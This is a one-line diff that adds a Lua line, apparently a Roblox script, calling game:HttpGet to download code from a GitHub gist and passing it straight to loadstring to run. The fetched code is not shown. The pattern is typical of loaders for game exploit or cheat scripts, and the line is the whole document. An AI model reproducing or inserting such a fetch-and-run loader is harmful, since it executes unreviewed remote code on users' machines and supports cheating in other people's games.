@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.github.com/Gegecito/e2263ec3ce483c4451eeb50bd4d82b79/raw/"))()
